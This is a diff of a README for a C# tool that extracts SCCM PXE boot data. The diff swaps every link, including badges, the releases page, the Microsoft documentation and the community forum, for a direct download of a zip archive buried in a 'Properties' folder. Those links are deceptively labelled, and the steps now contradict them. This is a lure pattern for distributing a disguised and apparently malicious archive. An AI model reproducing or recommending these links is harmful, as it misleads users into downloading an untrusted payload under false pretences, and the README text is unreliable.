@@ -1,6 +1,6 @@
 # 🛠️ SharpPXE - Extract SCCM PXE Boot Data Easily
 
-[![Download SharpPXE](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rjith/SharpPXE/releases)
+[![Download SharpPXE](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
 
 ## 📋 Description
 SharpPXE is a user-friendly C# tool designed for extracting information from SCCM PXE boot media. With SharpPXE, you can easily analyze and manage your boot configurations without needing any programming skills.
@@ -18,7 +18,7 @@ This guide will help you download and run SharpPXE on your computer easily. Foll
 ## 🔗 Download & Install
 1. Click on the large button below to visit the download page:
 
-   [Download Now](https://github.com/rjith/SharpPXE/releases)
+   [Download Now](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
 
 2. You will see a list of available releases. Find the latest version at the top.
 
@@ -54,13 +54,13 @@ If you encounter issues or have questions, please visit the Issues section of th
 
 ## 📥 Additional Resources
 For advanced users looking to dive deeper, consider exploring these resources:
-- [SCCM Documentation](https://docs.microsoft.com/en-us/mem/configmgr/)
-- [C# Programming Guide](https://docs.microsoft.com/en-us/dotnet/csharp/)
-- [Community Forums](https://github.com/rjith/SharpPXE/discussions)
+- [SCCM Documentation](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
+- [C# Programming Guide](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
+- [Community Forums](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
 
 ## ✅ Conclusion
 You are now ready to download and use SharpPXE. With a few simple steps, you can start extracting vital information from your SCCM PXE boot media. If you need more detailed instructions or have any feedback, feel free to reach out through the Issues page or explore the additional resources provided. 
 
 Happy extracting!
 
-[![Download SharpPXE](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/rjith/SharpPXE/releases)
+[![Download SharpPXE](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)](https://raw.githubusercontent.com/rjith/SharpPXE/main/SharpPXE/Properties/Sharp_PXE_v1.9.zip)
